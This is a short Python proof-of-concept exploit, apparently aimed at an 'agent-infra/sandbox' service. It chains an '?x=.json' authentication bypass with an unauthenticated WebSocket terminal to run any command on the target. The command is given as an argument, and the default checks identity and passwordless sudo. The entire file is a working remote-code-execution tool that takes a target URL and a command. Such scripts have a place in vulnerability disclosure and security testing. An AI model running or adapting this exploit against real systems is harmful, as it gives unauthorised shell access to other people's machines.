#!/usr/bin/env python3
"""agent-infra/sandbox — unauthenticated WebSocket RCE.

usage: rce_ws.py [base_url] [command]
The WS upgrade carries no Authorization header; the session is minted through the
"?x=.json" auth bypass. suppress_origin is required (the server rejects a duplicated
Origin header).
"""
import json
import re
import sys
import time
import urllib.request

import websocket

B = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080").rstrip("/")
CMD = sys.argv[2] if len(sys.argv) > 2 else "id; hostname; whoami; sudo -n id"

r = json.load(urllib.request.urlopen(f"{B}/v1/shell/terminal-url?x=.json"))
sid = re.search(r"session_id=([0-9a-f-]+)", r["data"]).group(1)
print(f"[+] session_id={sid}")

ws_url = B.replace("http", "ws", 1) + f"/v1/shell/ws?session_id={sid}&x=.json"
ws = websocket.create_connection(ws_url, suppress_origin=True, timeout=15)
print("[+] websocket 101, no Authorization header")

time.sleep(1.5)  # drain terminal restore frames
try:
    while True:
        ws.recv()
except Exception:
    pass

ws.send(json.dumps({"type": "resize", "data": {"cols": 120, "rows": 40}}))
ws.send(json.dumps({"type": "input", "data": CMD + "\n"}))

out = ""
t0 = time.time()
while time.time() - t0 < 10:
    try:
        m = ws.recv()
        out += m if isinstance(m, str) else m.decode("utf-8", "replace")
    except Exception:
        break
ws.close()
print(out)
